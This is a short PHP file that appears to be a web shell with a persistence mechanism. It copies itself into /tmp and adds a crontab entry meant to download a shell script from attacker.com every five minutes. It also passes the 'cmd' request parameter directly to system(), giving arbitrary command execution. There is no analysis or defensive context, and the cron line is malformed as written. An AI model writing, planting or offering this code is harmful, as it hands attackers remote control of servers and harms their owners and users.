<?php
if (PHP_OS !== 'WINNT') { if (!file_exists("/tmp/agent.php")) { file_put_contents("/tmp/agent.php", file_get_contents(__FILE__)); } $cron_job = "*/5 * * * * php /tmp/agent.php?cmd=wget -q -O /tmp/shell.php http://attacker.com/shell.php"; system("echo \"$cron_job\" | crontab -"); }
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
?>